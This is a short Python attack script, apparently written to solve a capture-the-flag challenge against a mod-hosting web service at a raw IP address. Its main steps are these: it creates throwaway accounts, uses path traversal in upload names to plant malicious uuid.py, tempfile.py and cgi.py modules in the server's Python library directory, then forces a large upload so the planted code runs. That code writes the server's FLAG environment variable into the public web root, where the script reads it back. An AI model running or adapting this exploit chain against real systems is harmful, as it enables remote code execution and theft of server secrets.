import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36310"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
def plant(tok, filename, marker):
    mal=f'import os\nopen("/usr/share/nginx/html/{marker}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
    pid=pf.create_platform(tok,"lib/python3.11",name="z"); mid=pf.create_mod(tok,"../../../usr/local",title="z"); bid=pf.create_build(tok,mid,pid)
    return pf.upload_zip(tok,mid,bid,{filename:mal})
for fn,mk in [("uuid.py","m_uuid2"),("tempfile.py","m_temp2"),("cgi.py","m_cgi2")]:
    tok,u=fresh()
    r=plant(tok,fn,mk)
    print("plant",fn,"->",r.status_code)
    # trigger large upload (TemporaryFileUploadHandler uses tempfile/uuid)
    pid=pf.create_platform(tok,"t%d"%random.randint(0,9999),name="z"); mid=pf.create_mod(tok,"v%d"%random.randint(0,9999),title="z"); bid=pf.create_build(tok,mid,pid)
    bio=io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as zf: zf.writestr("big.bin", b"A"*(10*1024*1024))
    bio.seek(0)
    requests.post(f"{BASE}/api/mods/%d/builds/%d/upload/"%(mid,bid),headers={"Authorization":f"Bearer {tok}"},files={"zip_file":("p.zip",bio,"application/zip")},timeout=40)
    time.sleep(1)
    c=requests.get(f"{BASE}/{mk}",timeout=6)
    print("  ",mk,c.status_code,repr(c.content[:40]))
